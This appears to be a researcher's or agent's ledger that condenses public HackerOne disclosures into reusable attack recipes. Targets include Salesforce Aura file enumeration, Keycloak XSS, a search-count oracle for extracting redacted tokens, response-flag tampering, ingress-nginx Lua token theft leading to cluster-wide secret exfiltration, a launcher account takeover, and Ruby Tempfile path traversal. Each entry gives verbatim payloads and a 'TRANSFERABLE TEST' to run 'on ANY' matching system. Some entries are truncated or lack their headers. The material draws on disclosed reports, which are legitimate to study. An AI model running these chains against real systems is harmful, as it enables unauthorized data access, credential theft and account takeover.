TRANSFERABLE TEST: on ANY Salesforce Experience Cloud / Lightning site — (1) open a public page and capture a POST to `/s/sfsites/aura` (or `/aura`) in Burp; (2) decode the `message` parameter and replace `actions[0].descriptor` with `serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems` and `params` with `{"entityNameOrId":"ContentDocument","layoutType":"FULL","pageSize":2000,"currentPage":0,"useTimeout":false,"getCount":false,"enableRowActions":false}`; (3) send it and check whether the response contains `ContentDocument` records with `Id`s; (4) take an `Id` and request `/sfsites/c/sfc/servlet.shepherd/document/download/<Id>` — if the file downloads with no auth, the chain is live. Rule: **the Aura endpoint is a generic method dispatcher keyed by the `descriptor` string — if you can swap the descriptor to a controller that reads an arbitrary entity, you can enumerate and download every record of that entity, and the shepherd download endpoint serves them with no auth check.**
DEDUPE: 0 hits across all three write targets for `2623715`, `salesforce`, `sfsites`, `/aura`, `SelectableListDataProvider`, `ContentDocument`, `ApexAction`, `shepherd/document`, or `experience.cloud`. The one `Salesforce` hit in `Bugbountyskills.md` (line ~23035) is an unrelated record-id key-prefix note. New general method -> §17.440.

SOURCE: https://hackerone.com/reports/2221104  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (the reporter body is public). The report's own PoC is the malformed-JSON trigger `{" ":1}`; the concrete XSS payload was read from the credited public pentest report the HackerOne report cites — Cure53, "Pentest-Report Keycloak 8.0 Audit & Pentest 11.2019" (cure53.de/pentest-report_keycloak.pdf), finding KC-01-007, read this pass via `web_extract`. Metadata: U.S. Dept Of Defense, "Reflected XSS via Keycloak on ███ [CVE-2021-20323]", weakness Cross-site Scripting (XSS) - Reflected, severity Medium, CVE-2021-20323, reporter `maskedpersian`, submitted 2023-10-22, disclosed 2024-05-03, state Closed/Resolved, asset U.S. Dept Of Defense.
STATUS: UNVERIFIED (not reproduced — no Keycloak instance was touched this pass; the request shape is verbatim from the report body and the payload is verbatim from the credited cure53 report).
CLASS: reflected XSS via an unrecognized JSON field name — Keycloak's OpenID Connect Dynamic Client Registration endpoint reflects an unrecognized JSON property name unfiltered into an HTML error page (CWE-79).
CORE METHOD:
  1. ENTRY POINT — `POST /auth/realms/<realm>/clients-registrations/openid-connect` with `Content-Type: application/json`.
  2. THE PAYLOAD IS A JSON FIELD NAME, not a value — the report's own PoC is `{" ":1}` (a space key); the credited cure53 report gives the concrete XSS payload as an unrecognized field name: `{"<svg onload=alert(1)>": ...}`.
  3. THE REFLECTION — the server responds with an HTML error page containing the unrecognized field name verbatim: `Unrecognized field "<svg onload=alert(1)>" (class org.keycloak.representations.oidc.OIDCClientRepresentation), not marked as ignorable`.
  4. THE LIMIT — cure53 rates it Info: "not directly exploitable as it requires the request's content-type to be JSON. Browsers are not able to carry this out cross-origin because an SOP violation would take place." Delivery needs same-origin JS execution or a CORS/preflight allowance.
DETECTION SIGNAL: a Keycloak / Red Hat SSO / OIDC dynamic-client-registration endpoint (`/auth/realms/*/clients-registrations/openid-connect`, `/realms/*/clients-registrations/openid-connect` on newer Keycloak) that returns a 4xx error whose body contains the submitted JSON field name; a response with `Content-Type: text/html` for a JSON request; a version at or below Keycloak 8.0 (CVE-2021-20323). TELL: the error message echoes the field NAME — so the payload goes in a JSON key, not a value.
CHAIN: any visitor (primitive: a public OIDC client-registration endpoint) -> POST a JSON body whose field NAME is an HTML payload (primitive: the endpoint reflects unrecognized field names unfiltered into an HTML error page) -> the error page renders the payload in the Keycloak origin (escalation: script execution) -> the victim's Keycloak session cookie is readable (impact: cookie theft / account compromise; the report's own words: "An attacker can execute arbitrary script and thus steal cookie-based authentication credentials"). HONESTY NOTE: cure53 (the credited source) rates the delivery "not directly exploitable" because a browser cannot send the required `application/json` POST cross-origin without a CORS/preflight allowance; the chain reaches full impact only where the victim is same-origin or the preflight is satisfied. Per doctrine §8: preconditions = the victim renders the error page (same-origin JS execution or CORS allowance); gain = the Keycloak session cookie.
TRANSFERABLE TEST: on ANY Keycloak / OIDC dynamic-client-registration endpoint — (1) POST `Content-Type: application/json` with body `{"<svg onload=alert(1)>": "x"}` to `/auth/realms/<realm>/clients-registrations/openid-connect`; (2) inspect the 4xx response: if the field name appears verbatim in an HTML body, the reflection is live; (3) confirm the delivery constraint by checking whether the endpoint sends `Access-Control-Allow-Origin` for a cross-origin `Origin` header (if it does, a cross-origin `fetch` can deliver the payload; if not, the chain needs a same-origin delivery). Rule: **on a JSON API error page, the reflected token may be a field NAME rather than a value — put the HTML payload in a JSON key and read the error message; and always check the CORS preflight before claiming cross-origin XSS.**
DEDUPE: 0 hits across all three write targets for `2221104`, `CVE-2021-20323`, `keycloak`, `clients-registrations`, `cure53`, or a JSON-field-name reflection. New general method -> §17.441.

STATUS: UNVERIFIED (not reproduced — no HackerOne account or search endpoint was touched this pass; every request shape below is verbatim from the report body / the PoC).
CLASS: information disclosure via a SEARCH-COUNT BOOLEAN ORACLE — a search endpoint that matches NON-PUBLIC content (the full body of a limited-disclosure report) and returns a hit COUNT gives a yes/no oracle; a wildcard prefix turns it into a character-by-character secret extractor (CWE-200 / CWE-209).
CORE METHOD:
  1. ENTRY POINT — the beta Hacktivity search. The PoC runs on an ANONYMOUS account (`hackerone.com/hacktivity/overview`, incognito) in the browser console and calls `POST https://hackerone.com/graphql`.

THE QUERY, verbatim from the PoC: `{"operationName":"HacktivitySearchQuery","variables":{"queryString":"(<PREFIX><guess>*) AND <REPORT_ID>","size":1,"from":0,"sort":{"field":"total_awarded_amount","direction":"DESC"}},"query":"query HacktivitySearchQuery($queryString: String!, $from: Int, $size: Int, $sort: SortInput!) { search(index: HacktivityReportIndexService query_string: $queryString from: $from size: $size sort: $sort) { __typename total_count } }"}` with headers `accept: */*`, `content-type: application/json`, `x-csrf-token: <csrf-token meta value>`.

THE ORACLE — `resp.data.search.total_count` is the boolean: `> 0` means the wildcard prefix `(PREFIX<guess>*)` matches a word in the FULL report (including the non-public body), `0` means it does not. The PoC's own loop tries every alphanumeric char (`a-z`, `A-Z`, `0-9`), keeps the first char that makes `total_count > 0`, appends it, and repeats.
  4. THE LEAK — the report's worked example: a (fake) GitHub personal access token starting with `ghp_` inside report #1711938. `(ghp_a*) AND 1711938` -> 0; ... `(ghp_f*) AND 1711938` -> a hit; then `(ghp_fa*)`, `(ghp_fb*)`, ... The reporter's cost estimate: 62 chars / 2 = 31 tries per character x 36 chars = ~1,116 requests. The PoC leaked 3 chars as a demo, 6 in the automated run.
  5. THE CORRECTION — the reporter first claimed character-by-character extraction, then retracted it ("it only works for full words, not characters, so secrets cannot be leaked"), then found the `*` wildcard makes character-by-character extraction possible again. The wildcard is the whole technique.
DETECTION SIGNAL: a search/count endpoint (GraphQL `search`, Elasticsearch `_search`, Algolia, a site-search API) that returns a hit COUNT (`total_count`, `total`, `hits.total`, `count`) and whose index includes content the caller cannot read — redacted text, private/draft records, limited-disclosure bodies, other users' data. TELL: the count changes for a term you cannot see anywhere in the public view. Secondary tell: the query language supports a trailing wildcard (`*`) or a prefix match.
CHAIN: any unauthenticated caller (primitive: the search endpoint needs no auth) -> submit `(PREFIX<guess>*) AND <id>` and read `total_count` (primitive: the count is a boolean oracle over non-public content) -> iterate the alphabet to extend the match one character at a time (escalation: character-by-character reconstruction) -> recover a secret redacted inside a limited-disclosure report (impact: disclosure of a credential/secret the platform deliberately hid; the report's own example is a `ghp_` GitHub PAT). Per doctrine §8: preconditions = none (anonymous, the beta search feature enabled); gain = any word/secret in the full body of a limited-disclosure report. HONESTY NOTE: the team rated it Medium 6.1 and closed it "C:L — no complete loss of confidentiality and the secrets which would be present in resolved reports would have already been revoked"; the reporter's own first impact claim (character-by-character without the wildcard) was retracted.
TRANSFERABLE TEST: on ANY search/count endpoint — (1) pick a record you cannot read (a redacted/private/draft item) and a term you know is in it; (2) query the search with that term plus the record id and read the hit count — if the count is > 0 for a term that appears nowhere in the public view, the index covers non-public content; (3) confirm the query language supports a prefix wildcard (`term*`, `(prefix*)`), then brute-force a secret character-by-character with `(PREFIX<guess>*) AND <id>` and watch `total_count`; (4) a hit at each step reconstructs the secret. Rule: **a search endpoint that returns a hit count over content you cannot see is a boolean oracle — if the query language supports a prefix wildcard, it is a character-by-character secret extractor.**
DEDUPE: 0 hits across all three write targets for `2213251`, `HacktivitySearchQuery`, `HacktivityReportIndexService`, or a count-based search oracle. Pre-existing hits that are RELATED but NOT this technique: `query_string` (ledger ~3277 / ~3281) is the GraphQL `sort_query`/`_script` Elasticsearch injection entry — a free-form SORT string reaching the query phase, not a hit-count oracle; `total_count` (ledger ~3135 / ~5533 / ~6663) is the GraphQL field-oracle counts (`soft_launch_invitations{total_count}`, `whitelisted_hackers{total_count}`, `participants{total_count}`), not a search-hit count; §17.174 (#493176) is a DIFFERENT mechanism — the ORDER of two concurrent HTTP/2 responses (timeless timing) as a cross-site search oracle — not a returned hit count; §17.206 is a `%<N>c` format-string oracle. New general method -> §17.442.

SOURCE: https://hackerone.com/reports/1539426  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL. Metadata: UPS VDP, "Broken access control", weakness Improper Authentication - Generic, severity High, reporter `nayefhamouda`, submitted 2022-04-13, disclosed 2022-06-18, state Closed.
STATUS: UNVERIFIED (not reproduced — no UPS endpoint was touched this pass; the request/response shapes below are verbatim from the report body, whose domains are redacted).
CLASS: broken access control via a CLIENT-SIDE STATUS-FLAG GATE — the app's client branches on a server-returned `status` boolean to decide whether to show a privileged page, and the privileged page/flow does not re-verify the precondition server-side (CWE-863 / CWE-639).
CORE METHOD:
  1. ENTRY POINT — `POST /api/Account/SendTempPassword/?userName=<email>` (the report's request, verbatim: `HTTP/2`, `Host: ██████████████████`, `Cookie: ████████`, `Accept: application/json, text/plain, */*`, `Content-Length: 0`).
  2. THE GATE — the response is JSON: `{"status":false,"errorMessage":"Username does not exist. Please enter correct Username."}`.
  3. THE BYPASS — intercept the response and change `"status":false` to `"status":true` (the report: "On the burp site, intercept the response for this request and change this value ... change the 'status' value of this request from false to true").
  4. THE UNLOCK — then visit `/resetPassword`: "You will notice that this page has been opened without problems ... Go to user or report and you will notice that it opens normally and you can fully control it."
  5. THE IMPACT (report's words) — "The attacker can hack the admin control panel and view and modify all reports."
DETECTION SIGNAL: an endpoint that returns a JSON `status`/`success` boolean which the client uses to decide whether to render a privileged page or continue a flow; a privileged page/route that is reachable by URL and whose server-side handler does not re-check the precondition (a temp password was actually issued, the user is actually an admin); a reset/unlock flow whose only gate is the client's interpretation of the flag. TELL: flip the boolean in the intercepted response and reload the privileged route — if it renders and works, the gate is client-side.
CHAIN: any visitor (primitive: the `SendTempPassword` endpoint is reachable) -> intercept the JSON response and set `status:true` (primitive: the client trusts the flag) -> the client unlocks `/resetPassword` (escalation: the privileged flow is entered) -> the reset/admin page works with no server-side re-check (impact: admin panel access / full control of reports, per the report). Per doctrine §8: preconditions = the ability to intercept/modify your own response (Burp / a MITM position) and reach `/resetPassword`; gain = the admin/support panel. HONESTY NOTE: the report is thin — the domains are redacted, the PoC is a video, and no request shape is given for `/resetPassword` itself — so the exact server-side check that is missing is inferred from the report's steps, not shown.
TRANSFERABLE TEST: on ANY flow where a JSON response's `status`/`success` boolean gates a privileged page — (1) capture the gate endpoint's response; (2) flip the boolean to `true` and re-send/reload; (3) navigate directly to the privileged route (`/resetPassword`, `/admin`, `/unlock`) and check whether it renders and whether its server-side actions succeed; (4) if the privileged action works with the flag forged, the gate is client-side. Rule: **a server-returned `status` boolean is not an authorization check — flip it in the intercepted response and see whether the privileged page actually works.**
DEDUPE: 0 hits across all three write targets for `1539426`, `SendTempPassword`, `resetPassword`, `status.*tamper`, or a response-flag-gated route. The recorded client-side-gate material is a DIFFERENT mechanism: ledger ~line 9674 (a re-auth gate cleared by DROPPING the validation request, not tampering a response) and the detection signal at ~line 9405 ("a flow whose only auth gate is the redirect STATUS"). This entry is a DELTA of that class with a NEW MECHANISM (tampering a JSON `status` field), NO §17 slot.

SOURCE: https://hackerone.com/reports/1249583  2026-11-11
ROUTE: live `.json` -> HTTP 200, `visibility: full`, `vulnerability_information` read IN FULL (17,322 B — the YAML snippet, the impact, the kube-apiserver-proxy section and the PoC steps). Metadata: Kubernetes, "Authenticated kubernetes principal with restricted permissions can retrieve ingress-nginx serviceaccount token and secrets across all namespaces", weakness Privilege Escalation, severity High, reporter `libio`, submitted 2021-07-01, disclosed 2021-12-04, state Closed. Versions in-report: Kubernetes any (tested AWS EKS 1.20); ingress-nginx chart `ingress-nginx-3.33.0`, application `0.47.0`.
STATUS: UNVERIFIED (not reproduced — no Kubernetes cluster or ingress-nginx controller was touched this pass; every YAML/request below is verbatim from the report body).
CLASS: privilege escalation — an authenticated Kubernetes principal with permission to create `ingress` and `service` objects reads the ingress-nginx controller pod's ServiceAccount token via a `server-snippet` Lua block, then uses that token (whose ClusterRole can `list secrets` in ALL namespaces) to exfiltrate every cluster secret and every ServiceAccount token -> cluster-admin; a sibling `ExternalName` Service exposes the kube-apiserver itself (CWE-269 / CWE-200 / CWE-863).
CORE METHOD:
  1. THE SNIPPET — set `nginx.ingress.kubernetes.io/server-snippet` on an Ingress to a YAML block scalar, verbatim:
     `set_by_lua $token ' local file = io.open("/run/secrets/kubernetes.io/serviceaccount/token") if not file then return nil end local content = file:read "*a" file:close() return content ';`
     `location = /token { content_by_lua_block { ngx.say(ngx.var.token) } }`
  2. THE READ — request `https://$INGRESS_HOST/token` (the report: the hostname does not have to resolve to the controller's loadbalancer; adding the `Host` header manually also works) -> the controller pod's ServiceAccount JWT comes back in the body.
  3. THE ESCALATION — decode the token to confirm it is `ingress-nginx`; that ServiceAccount is bound to a ClusterRole that can `list secrets` in ALL namespaces. With it: exfiltrate all Kubernetes secrets, and read the tokens of ALL serviceaccounts -> elevate to potentially cluster-admin.
  4. THE KUBE-APISERVER PROXY (the NEW atom) — create a Kubernetes `Service` of type `ExternalName` pointing at `kubernetes.default` (the in-cluster API server DNS name) and an Ingress rule routing to it: "This can expose an otherwise private and protected kube-apiserver to untrusted networks like the internet." The PoC writes a kubeconfig that talks to the API server THROUGH the ingress-nginx proxy using the stolen token.
  5. THE PoC — `poc.sh` (requires `INGRESS_HOST`): applies the ingress + service, retrieves the token, writes a local kubeconfig (via the apiserver proxy, with the ingress-nginx token), writes all secrets from all namespaces to `secrets.json`, then for each serviceaccount token checks for cluster-admin and adds a user/context to the kubeconfig.
DETECTION SIGNAL: an ingress/controller whose config is templated from user-settable annotations or snippets (`nginx.ingress.kubernetes.io/server-snippet`, `configuration-snippet`, `*-snippet`) — the tell is that `{`, `}` and newlines SURVIVE into `/etc/nginx/nginx.conf`; the always-present token path `/run/secrets/kubernetes.io/serviceaccount/token` (or `/var/run/secrets/...`) mounted in the controller pod; a controller whose ClusterRole is broad (`list secrets` cluster-wide). For the proxy: a `Service` of type `ExternalName` whose `externalName` is `kubernetes.default` / `kubernetes.default.svc.cluster.local`, or any ingress rule whose backend is an in-cluster DNS name.
CHAIN: an authenticated principal that can create `ingress` + `service` (primitive: namespaced object write, no cluster role) -> the `server-snippet` value is spliced into `nginx.conf` and defines a Lua-backed location (primitive: config injection) -> GET `/token` returns the controller pod's ServiceAccount JWT (escalation: credential read) -> that SA's ClusterRole lists Secrets in ALL namespaces (escalation: cluster-wide secret/SA-token exfiltration) -> cluster-admin (impact). The sibling `ExternalName` Service exposes the kube-apiserver to untrusted networks (impact: control-plane exposure). Per doctrine §8: preconditions = create `ingress` + `service` in one namespace and network access to the controller; gain = every cluster secret and every ServiceAccount token, plus a proxied kube-apiserver.
TRANSFERABLE TEST: on ANY ingress-nginx / Traefik / HAProxy / Envoy / Istio instance you can create objects on — (1) apply an Ingress with `nginx.ingress.kubernetes.io/server-snippet` set to the `set_by_lua`/`content_by_lua_block` block above and request `/token` with a manual `Host` header; a JWT in the body proves the token-read; (2) decode it and run `kubectl --token=<jwt> auth can-i list secrets -A` (or `GET /api/v1/namespaces/*/secrets`) — a 200 proves the cluster-wide read; (3) create a `Service` of type `ExternalName` with `externalName: kubernetes.default` plus an Ingress rule for it and request the API server through the ingress host — a version/manifest response proves the control-plane proxy. Rule: **a snippet annotation that reaches Lua is a credential-read primitive — the mounted ServiceAccount token is the prize, and an `ExternalName` Service pointed at `kubernetes.default` turns the ingress into an unauthenticated kube-apiserver proxy.**
DEDUPE: the CORE of this report (ingress-nginx annotation/path injection -> read the controller pod's ServiceAccount token -> cluster-wide `list secrets`) is ALREADY RECORDED — #1382919 (`spec.rules.http.paths.path` -> `alias /var/run/secrets/kubernetes.io/serviceaccount/` -> GET `/gaf/token` -> token -> cluster-wide secrets, High 7.6), #2039464 (`permanent-redirect` -> Lua -> token -> `kubernetes.default.svc`), #1620702, and §17.172 (a directive-name denylist bypassed by an alternate directive reaching the same sink). This entry is a DELTA of that family. The NEW atom is the `ExternalName` Service -> kube-apiserver proxy: 0 hits across all three write targets for `ExternalName`, `kube-apiserver`, `apiserver`, or `kubernetes.default` as a proxy target. New general method (the ExternalName proxy) -> §17.443.

STATUS: UNVERIFIED (not reproduced — no Rockstar/Steam/Epic account or launcher was touched this pass; every quote below
  is verbatim from the public team summary).
CLASS: authentication bypass / privilege escalation -> account takeover — a client account-SWITCH flow treats possession
  of a linked third-party credential as proof of the FIRST-PARTY account's identity, so it switches into the victim's
  first-party account with no credential prompt (CWE-287).
CORE METHOD:
  1. THE TRUST ASSUMPTION, verbatim: "The Launcher, in this state, assumed that if the current user had access to the
     linked third-party account (Epic Games or Steam), they must be the authentic user."
  2. THE PRECONDITION, verbatim: "the attacker first needed access to a Steam or Epic Games account with entitlement to
     a game with Social Club connectivity (such as GTAV or RDR2) and that had previously been linked to a Social Club
     account (i.e. the victim's account)."
  3. THE ACTION: the attacker launches an R* game; the Launcher detects the linked third-party account and "would allow
     the attacker to switch to the victim's Social Club account without prompting for credentials."
  4. THE IMPACT, verbatim: "This assumption gave the attacker access to the victim's entire Social Club account, even if
     the victim was utilizing mutli-factor authentication."
  5. THE FIX, verbatim: "Account switches occurring in contexts like this one will now require the user to re-authenticate
     by entering their Social Club account credentials if they have not done so recently on the device in question."
DETECTION SIGNAL: a desktop launcher / client / SSO that supports (a) linking a third-party provider account to a
  first-party account and (b) SWITCHING between accounts on one device; the switch path checks only whether the current
  OS/user session can reach the linked third-party account (its library/entitlement/session) and never asks for the
  first-party account's credentials; a "switch account"/"change user" action that completes while the first-party
  session is not re-authenticated. TELL: the vendor's own fix wording — re-authentication is required "if they have not
  done so recently on the device in question" — i.e. the missing control is a RE-AUTH GATE ON THE SWITCH, not on the link.
CHAIN: attacker holds a third-party account that is linked to the victim's first-party account (primitive: a linked
  credential — a stale link, a shared/family device, a link made before a password change, or a link the victim created
  to the attacker's account) -> the launcher's account-switch treats third-party access as identity proof and skips the
  first-party credential prompt (escalation: authentication bypass) -> the attacker is dropped into the victim's
  first-party account session (impact: full account takeover, the first-party MFA is never consulted). Per doctrine §8:
  preconditions = control of a third-party account linked to the victim's first-party account, plus a device where the
  launcher can see that link; gain = the victim's full first-party account with MFA bypassed.
TRANSFERABLE TEST: on ANY client/launcher/SSO that links a third-party provider to a first-party account and can SWITCH
  accounts on one device — (1) link a third-party account of yours to a first-party test account, then change the
  first-party password (the link persists); (2) on a second device/profile, sign in to the third-party provider only and
  launch/switch: if the first-party account opens with no credential prompt, the switch trusts the link; (3) in the
  web/SSO sibling, replay the account-switch callback with the third-party provider's token and no first-party session
  and see whether a first-party session is minted. Rule: **a linked third-party credential is a LINK, not an IDENTITY —
  any flow that switches or mints a first-party session from third-party possession alone, without re-authenticating
  the first-party account, is an ATO primitive.**
DEDUPE: 0 hits across all three write targets for `1235008`, `Social Club`, `RGL`, `hacktus`, or a "switch trusts the
  linked credential" flow. Pre-existing account-linking material REVIEWED and NOT re-recorded (different mechanism):
  §17.285 (an `external login` LINKING endpoint that takes the TARGET user's id in the path/body -> BOLA on linking —

  revoke its sessions — a session-lifecycle flaw, not a switch-trust flaw), and the Valve/Steam custom-scheme entries
  (§17.58 / §17.149). None records the missing RE-AUTH GATE ON ACCOUNT SWITCH. New general method -> §17.444.

SOURCE: https://hackerone.com/reports/1131465  2026-11-11
ROUTE: `web_extract` -> HTTP 200, the reporter body rendered IN FULL (36,635 clean chars, saved to
`/root/.hermes/cache/web/hackerone.com-1cf964ca7e.md`; the omitted middle was read back from that file).
Ruby, "Path traversal in Tempfile on windows OS due to unsanitized backslashes" (reporters
`bugdiscloseguys` / HTTPVoid — Harsh and Rahul — with collaborator `iamnoooob`; submitted 2021-03-20,
disclosed 2021-04-07, Resolved, Medium 4 ~ 6.9, weakness Path Traversal, CVE-2021-28966; the Internet
Bug Bounty rewarded both reporters). FRESHNESS CAVEAT: 2021, outside the preferred 6-12-month window —
admitted because it was opened and read in full THIS pass and the specific mechanism was absent from
all three write targets (0 hits for `Tempfile`, `UNUSABLE_CHARS`, `ALT_SEPARATOR`, `String#delete`).
STATUS: UNVERIFIED (not reproduced — no Windows Ruby host stood up this pass; the RCE rung is the
reporter's assertion, not a demonstrated PoC)
CLASS: Path traversal -> arbitrary file create (CWE-22) inside a temp-file helper; the reusable atom
is the SANITIZER, not Ruby.
CORE METHOD:
  1. THE CARRIER, verbatim: "both arguments (basename and ext) of Tempfile on Windows are vulnerable to
     a path traversal which could allow unintentional file creating in arbitrary writable directories.
     Tempfile often has a user control either by basename or ext (or both)." Any app that passes a
     user-influenced basename or extension into `Tempfile`/`Tempfile.open` (upload temp names, export
     filenames, a user-supplied `filename=` on a generated file) is the entry point.
  2. THE SANITIZER AND ITS FLAW, verbatim: "both arguments go through String::delete(UNUSABLE_CHARS) to
     delete OS file separators from the basename and ext ... however the incorrect usage of delete()
     will cause the bug to occur." `UNUSABLE_CHARS = [File::SEPARATOR, File::ALT_SEPARATOR,
     File::PATH_SEPARATOR, ":"].uniq.join("").freeze` -> the 4-char set `/\;:`. On Windows
     `File::ALT_SEPARATOR` is `\` ("For linux File::ALT_SEPARATOR is `nil` while for Windows its `\`"),
     so the set itself contains a backslash.
  3. THE MECHANISM: Ruby's `String#delete` set syntax follows `tr` — a `\` inside the set ESCAPES the
     next character rather than being a literal deletion target. In the set `/\;:`, the `\` escapes the
     `;`, so `\` is never deleted. Verbatim: `"FUZZ/../me/..\\please".delete(UNUSABLE_CHARS)` ->
     `"FUZZ..me..\\please"` — "As you can see `\\` still remains, this is because we need to escape
     `\\` (when followed by characters) before passing it to delete." The `/` IS removed; the `\` is NOT.
  4. THE RESULTING PATH, verbatim: `Tempfile.open(["..\..\..\..\..\Users\rootx\malicious",".rb"])` ->
     `#<Tempfile:C:/Users/rootx/AppData/Local/Temp\..\..\..\..\Users\rootx\malicious20210321-22472-fvuodx.rb>`
     and `dir C:\Users\rootx\` lists `malicious20210321-22472-fvuodx.rb` (0 bytes) — the file is
     created OUTSIDE the temp directory, at an attacker-chosen writable path. "The same can be
     accomplished via ext argument."
  5. ROOT-CAUSE DEPTH (collaborator `iamnoooob`, verbatim): `String#delete` maps to `rb_str_delete_bang`
     in `string.c`; "When there's a deletion of character performed on the input string, then the
     below If block should hit. However, in the case of `"aaa\\..\\".delete("\\/")` squeeze[c] was never
     true which led to no modifications." The `squeez` table is built by `tr_setup_table` — "the
     'squeez' array is populated via `tr_setup_table(s, squeez, i==0, &del, &nodel, enc)` call on line
     7695 which should imply the bug should be somewhere there" — and the same helper backs
     `squeeze`, which "also seems to suffer from a similar issue."
  6. VENDOR CONFIRMATION: Ruby staff — "This report was regression with
     https://github.com/ruby/ruby/commit/1c7e303b26090205f393595f15dadddd4b2d31b6"; `nobu` attached
     `0001-Make-usable-chars-more-strict.patch`; the reporters confirmed the fix.
DETECTION SIGNAL: any server-side helper that builds a temp/upload/export filename from user input and
"sanitizes" it by DELETING a blocklist of separator characters (`String#delete`, `tr`, a `gsub`
char-class, a `str_replace`/`replaceAll` list) instead of rejecting or allowlisting; the tell is a
deletion primitive whose set/regex syntax gives `\` a special meaning (an escape) so the blocklist
silently fails to remove it; a Windows target, or any target where `\` is a path separator (Windows
`ALT_SEPARATOR`, SMB/UNC paths, a Windows file share mounted into a Linux app); a filename/path
parameter whose value comes back in an error message, a download URL, a log line or a directory
listing with the `\` still present. Second signal: the sanitizer was written and tested on Linux —
where `\` is an ordinary filename character — and the app is deployed on Windows.
CHAIN: user-controlled basename/ext reaches a temp-file helper (primitive: one filename field) -> the
separator-blocklist sanitizer's deletion primitive treats `\` as an escape, so the ALT_SEPARATOR
survives -> the helper creates the file at an attacker-chosen path OUTSIDE the intended temp/upload
directory (DEMONSTRATED: `C:\Users\rootx\malicious...rb`, 0 bytes) -> ESCALATION (ASSERTED, not
demonstrated in the report): if the application writes attacker-influenced content into that file, or
the chosen path is one the app later loads/sources/executes — a `.rb` in `$LOAD_PATH`, a
config/plugins directory, a cron directory, an `.htaccess`/`web.config`, a DLL/`.so` directory, a
restart-watched file — the arbitrary file create becomes code execution. The reporter's own wording is
the honest limit: "Unintentional file creation in an arbitrary directory. Could potentially cause RCE
in RoR applications." No RCE PoC is included, so the chain's top rung is a lead, not a finding.
TRANSFERABLE TEST: on ANY filename/path parameter — (1) send a value with `..\` in the MIDDLE
(`..\..\tmp\x`), a trailing `..\`, a doubled `..\\`, and a `\`-only traversal (`..%5c`), and compare
the resulting path (response body, error/log line, download URL, or the file's actual location) with
the sanitized expectation — if the backslash survives into the path, the blocklist-deletion primitive
is escape-aware and the filter is broken; (2) run the `\`-only variants on EVERY Windows target even
when the `/` variants are correctly stripped — a `/`-only regex or a Linux-tested sanitizer passes
them; (3) once a separator survives, aim it at a directory the application later loads/executes and
check whether the file lands there. Rule: a sanitizer that DELETES a separator blocklist can itself
preserve a separator when the deletion helper treats `\` as an escape — always test `\` variants
separately from `/`, and treat "the sanitizer runs on Linux, the app runs on Windows" as a live
asymmetry, not a safe deployment.

CORE METHOD:
